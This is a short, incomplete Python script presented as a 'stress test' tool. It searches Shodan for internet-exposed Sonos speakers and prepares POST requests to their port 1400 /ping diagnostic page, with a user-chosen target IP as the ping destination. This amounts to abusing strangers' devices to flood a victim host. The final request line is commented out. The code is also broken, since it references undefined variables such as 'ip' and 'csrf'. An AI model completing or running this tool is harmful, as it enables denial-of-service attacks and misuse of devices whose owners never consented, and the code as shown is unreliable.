import requests
import os.path
import shodan
import sys

try: input = raw_input
except NameError: pass

if os.path.isfile("apiKey.txt"):
    with open('apiKey.txt', 'r') as myfile:
        apiKey=myfile.read().replace('\n', '')
else:
    apiKey = input("Please input your API Key\n>")
    apiKey.strip()
    if len(apiKey) != 32:
        while len(apiKey) != 32:
            apiKey = input("You seem to have input an invalid key,\nplease try again\n>")
    with open("apiKey.txt", "w") as apiFile:
        apiFile.write(apiKey)
    
host = input("Input the IP you wish to stress test.\n>")

api = shodan.Shodan(apiKey)
query = "Linux UPnP/1.0 Sonos/"
result = api.search(query)

for service in result['matches']:
    print service['ip_str']
    print service

headersping = {
    'Proxy-Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Origin': 'http://'+ip+':1400',
    'Upgrade-Insecure-Requests': '1',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Referer': 'http://'+ip+':1400/tools',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
}

dataping = {
  'csrfToken': csrf,
  'host': host
}

#response = requests.post('http://'+ip+':1400/ping', headers=headersping, data=dataping)
#print(response)
